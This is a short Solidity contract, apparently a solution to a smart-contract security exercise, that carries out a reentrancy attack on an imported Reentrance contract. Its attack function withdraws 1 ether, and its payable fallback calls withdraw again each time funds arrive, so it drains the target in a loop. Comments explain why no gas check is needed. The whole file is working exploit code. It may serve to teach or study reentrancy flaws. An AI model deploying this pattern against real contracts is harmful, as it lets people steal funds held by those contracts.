pragma solidity ^0.4.15;

import "./Reentrance.sol";

contract ReentranceAttack {

    Reentrance private reentranceContract;

    function ReentranceAttack(address reentranceAddress){
        reentranceContract = Reentrance(reentranceAddress);
    }

    function attackReentrance() {
        reentranceContract.withdraw(1 ether);
    }

    function() payable {
        // We don't need a conditional preventing execution if the gas available is too low because the
        // Solidity address.call() function retains enough gas to finish execution of the function from where it's called.
        // address.call() will return false if the called function runs out of gas.
        reentranceContract.withdraw(1 ether);
    }
}
